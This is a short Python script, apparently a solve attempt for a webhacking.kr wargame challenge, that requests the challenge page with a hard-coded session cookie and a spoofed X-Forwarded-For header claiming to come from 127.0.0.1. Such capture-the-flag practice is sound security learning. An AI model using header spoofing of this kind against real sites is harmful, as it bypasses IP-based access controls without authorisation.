import requests as req

url = "https://webhacking.kr/challenge/web-02/"
session = dict(PHPSESSID = "unrvspngs8aph1g6l6gg57i0fi")
headers = {'X-Forwarded-For':'127.0.0.1'}

res = req.get(url, headers=headers, cookies=session)
print(res.text)
